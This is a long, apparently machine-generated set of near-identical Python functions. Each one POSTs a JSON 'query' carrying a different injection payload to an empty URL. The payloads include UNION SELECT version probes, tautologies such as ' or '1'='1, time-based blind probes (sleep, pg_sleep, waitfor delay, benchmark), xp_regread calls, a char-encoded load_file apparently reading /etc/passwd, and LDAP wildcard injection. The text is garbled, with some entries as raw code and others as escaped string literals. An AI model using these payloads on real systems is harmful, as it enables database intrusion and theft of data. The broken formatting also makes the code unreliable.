                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22' union (select NULL, NULL, NULL, NULL,  (select @@version)) --\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22' union (select NULL, NULL, NULL, NULL,  NULL, (select @@version)) --\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x221'1\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x221 exec sp_ \x28or exec xp_\x29\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x221 and 1=1\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x221' and 1=(select count(*) from tablenames); --\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x221 or 1=1\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x221' or '1'='1\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22)%20or%20('x'='x\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22%20or%201=1\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22; execute immediate 'sel' || 'ect us' || 'er'\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22benchmark\x2810000000,MD5\x281\x29\x29#\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22update\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22\x22;waitfor delay '0:0:__TIME__'--\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x221\x29 or pg_sleep\x28__TIME__\x29--\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22||\x28elt\x28-3+5,bin\x2815\x29,ord\x2810\x29,hex\x28char\x2845\x29\x29\x29\x29\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22\\x22hi\\x22\\x22\x29 or \x28\\x22\\x22a\\x22\\x22=\\x22\\x22a\\x22\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22delete\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22like\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22\\x22 or sleep\x28__TIME__\x29#\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22pg_sleep\x28__TIME__\x29--\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22*\x28|\x28objectclass=*\x29\x29\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22declare \x40q nvarchar \x28200\x29 0x730065006c00650063 ...\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22or 0=0 #\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22insert\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x221\x29 or sleep\x28__TIME__\x29#\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22) or ('a'='a\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22; exec xp_regread\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22*|\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22\x40var select \x40var as var into temp end --\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x221\x29\x29 or benchmark\x2810000000,MD5\x281\x29\x29#\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22asc\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22\x28||6\x29\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22\\x22a\\x22\\x22 or 3=3--\\x22\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22\\x22 or benchmark\x2810000000,MD5\x281\x29\x29#\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22# from wapiti\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22or 0=0 --\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x221 waitfor delay '0:0:10'--\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22or 'a'='a\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22hi or 1=1 --\\x22\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22or a = a\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22UNION ALL SELECT\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22) or sleep(__TIME__)='\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22\x29\x29 or benchmark\x2810000000,MD5\x281\x29\x29#\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22hi' or 'a'='a\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x220\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x2221 %\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22limit\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22or 1=1\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22or 2 > 1\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22\\x22\x29\x29 or benchmark\x2810000000,MD5\x281\x29\x29#\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22PRINT\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22hi') or ('a'='a\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22or 3=3\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22));waitfor delay '0:0:__TIME__'--\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22a' waitfor delay '0:0:10'--\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x221;\x28load_file\x28char\x2847,101,116,99,47,112,97,115, ...\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22or%201=1\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x221 or sleep\x28__TIME__\x29#\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
